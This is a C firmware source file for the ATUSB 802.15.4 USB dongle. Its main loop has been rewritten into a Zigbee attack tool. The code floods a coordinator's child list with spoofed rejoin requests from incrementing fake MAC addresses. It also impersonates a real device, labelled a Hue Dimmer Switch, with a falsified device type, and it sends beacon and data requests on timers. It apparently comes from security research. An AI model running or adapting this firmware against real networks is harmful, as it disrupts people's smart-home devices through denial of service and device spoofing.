/*
 * fw/atusb.c - ATUSB initialization and main loop
 *
 * Written 2008-2011 by Werner Almesberger
 * Copyright 2008-2011 Werner Almesberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */


#include <stdint.h>

#include <avr/io.h>
#include <avr/sleep.h>
#include <avr/interrupt.h>
#include <util/delay.h>

#include "usb.h"

#include "board.h"
#include "sernum.h"
#include "spi.h"
#include "atusb/ep0.h"

#include "attack.h"

#ifdef DEBUG
#include "uart.h"
#endif


int main(void)
{
	board_init();
	board_app_init();
	reset_rf();

	user_get_descriptor = sernum_get_descr;

	/* now we should be at 8 MHz */

#ifdef DEBUG
	uart_init();
	static FILE atben_stdout = FDEV_SETUP_STREAM(uart_write_char, NULL,
						     _FDEV_SETUP_WRITE);
	stdout = &atben_stdout;
#endif

	usb_init();
	ep0_init();
#ifdef ATUSB
	timer_init();

	/* move interrupt vectors to 0 */
	MCUCR = 1 << IVCE;
	MCUCR = 0;
#endif

	/* Workflow:
	* 1. First set rejoin_flag to 1, trying to filling up ZC's child list with garbage.
	* 2. Set Rejoin_flag = 3, and modify the code in blocks which (rejoin_flag == 1), to set delay_ms(10000). Then jump into Rejoin_flag 1 (Sending the last garbage).
	* 3. After that, just to board_app.c, we handle IMQ interrupt there, for further beacon request/rejoin request/data request handling.
	*/
	sei();
	union Integer mac_addr;
	uint8_t rejoin_flag = 4;
	mac_addr.integer = 200000;
	while (1)
	{
		if (rejoin_flag == 4)
		{
		}
		if (rejoin_flag == 3) // Pretend to be the real ZED device, and set wrong device type (ST Sensor)
		{
			_delay_ms(30000);
			mac_addr.integer = 0xcc7af408; // Hue Dimmer Switch
			// mac_addr.integer = 0xbc8e0d01; // ST Sensor
			send_rejoin_request_device(mac_addr, 1);
			mac_addr.integer = 190000;
			rejoin_flag = 10; // Fill up with the last garbage
		}
		if (rejoin_flag == 2) // Pretend to be a sleepy ZED and send rejoin request
		{
			_delay_ms(90000);
			send_rejoin_request(mac_addr, 0);
			_delay_ms(100);
			send_data_request();
			mac_addr.integer += 1;
		}
		else if (rejoin_flag == 1) // Pretend to be a non-sleepy ZED and send rejoin request, then reply ACK
		{
			_delay_ms(90000);
			send_rejoin_request(mac_addr, 1);
			mac_addr.integer += 1;
			rejoin_flag = 10;
		}
		else if (rejoin_flag == 0) // Send beacon request
		{
			_delay_ms(50000);
			send_beacon_request();
		}
		else
		{
			sleep_mode();
		}
		
	}
}
